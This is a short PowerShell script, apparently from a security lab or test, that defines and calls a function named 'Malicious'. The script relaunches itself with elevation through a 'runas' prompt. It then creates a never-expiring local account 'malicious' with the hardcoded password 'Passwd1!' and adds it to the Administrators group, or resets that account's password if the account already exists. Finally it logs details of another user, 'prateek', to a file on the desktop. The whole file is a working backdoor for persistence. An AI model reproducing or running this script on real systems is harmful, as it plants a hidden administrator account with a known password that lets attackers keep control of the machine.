Function Malicious {
    #Get current user context
      $CurrentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
      
      #Check user is running the script is member of Administrator Group
      if($CurrentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator))
      {
           Write-host "Script is running with Administrator privileges!"
      }
      else
        {
           #Create a new Elevated process to Start PowerShell
           $ElevatedProcess = New-Object System.Diagnostics.ProcessStartInfo "PowerShell";
     
           # Specify the current script path and name as a parameter
           $ElevatedProcess.Arguments = "& '" + $script:MyInvocation.MyCommand.Path + "'"
     
           #Set the Process to elevated
           $ElevatedProcess.Verb = "runas"
     
           #Start the new elevated process
           [System.Diagnostics.Process]::Start($ElevatedProcess)
     
           #Exit from the current, unelevated, process
           Exit
     
        }
    
    $Username = "malicious"
    $Password = "Passwd1!"
    $group = "Administrators"
    
    $adsi = [ADSI]"WinNT://$env:COMPUTERNAME"
    $existing = $adsi.Children | Where-Object {$_.SchemaClassName -eq 'user' -and $_.Name -eq $Username }
    
    if ($null -eq $existing) {
    
        Write-Host "Creating new local user $Username."
        & NET USER $Username $Password /add /y /expires:never
        
        Write-Host "Adding local user $Username to $group."
        & NET LOCALGROUP $group $Username /add
    
    }
    else {
        Write-Host "Setting password for existing local user $Username."
        $existing.SetPassword($Password)
    }
    
    
    $existing = $adsi.Children | Where-Object {$_.SchemaClassName -eq 'user' -and $_.Name -eq 'prateek' }
    
    if($existing){
        $existing | Out-File $env:USERPROFILE\Desktop\priv2.log -Verbose
    }
    
    }
    
    malicious